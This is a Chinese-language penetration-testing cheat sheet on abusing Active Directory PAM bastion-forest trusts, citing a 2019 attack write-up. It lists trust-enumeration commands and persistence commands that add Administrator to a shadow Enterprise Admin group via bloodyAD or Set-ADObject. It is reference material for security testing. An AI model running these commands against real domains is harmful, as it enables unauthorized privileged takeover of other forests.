# 信任 - 特权访问管理 (Privileged Access Management)

> PAM (Privileged Access Management，特权访问管理) 引入了用于管理的堡垒林 (bastion forest) 和影子安全主体 (Shadow Security Principals，映射到受管林高权限组的组)。这允许在不更改组或 ACL 且无需交互式登录的情况下对其他林进行管理。

要求 (Requirements):

* Windows Server 2016 或更早版本

如果我们攻陷了堡垒林，我们就在另一个域上获得了 `Domain Admins` (域管理员) 权限

* PAM 信任的默认配置 (Default configuration for PAM Trust)

    ```ps1
    # 在我们的林上执行
    netdom trust lab.local /domain:bastion.local /ForestTransitive:Yes 
    netdom trust lab.local /domain:bastion.local /EnableSIDHistory:Yes 
    netdom trust lab.local /domain:bastion.local /EnablePIMTrust:Yes 
    netdom trust lab.local /domain:bastion.local /Quarantine:No
    # 在我们的堡垒林上执行
    netdom trust bastion.local /domain:lab.local /ForestTransitive:Yes
    ```

* 枚举 PAM 信任 (Enumerate PAM trusts)

    ```ps1
    # 检测当前林是否为 PAM 信任
    Import ADModule
    Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}

    # 枚举影子安全主体
    Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl

    # 枚举当前林是否由堡垒林管理
    # Trust_Attribute_PIM_Trust + Trust_Attribute_Treat_As_External
    Get-ADTrust -Filter {(ForestTransitive -eq $True)} 
    ```

* 利用 (Compromise)
    * 使用之前发现的影子安全主体（WinRM 帐户、RDP 访问、SQL 等）
    * 使用 SID 历史记录 (SID History)
* 持久化 (Persistence)
    * Windows/Linux:

    ```ps1
    bloodyAD --host 10.1.0.4 -u john.doe -p 'Password123!' -d bloody add groupMember 'CN=forest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=domain,DC=local' Administrator
    ```

    * 仅限 Windows (Windows only):

    ```ps1
    # 将被控用户添加到组中
    Set-ADObject -Identity "CN=forest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=domain,DC=local" -Add @{'member'="CN=Administrator,CN=Users,DC=domain,DC=local"}
    ```

## 参考资料 (References)

* [How NOT to use the PAM trust - Leveraging Shadow Principals for Cross Forest Attacks - Thursday, April 18, 2019 - Nikhil SamratAshok Mittal](http://www.labofapenetrationtester.com/2019/04/abusing-PAM.html)
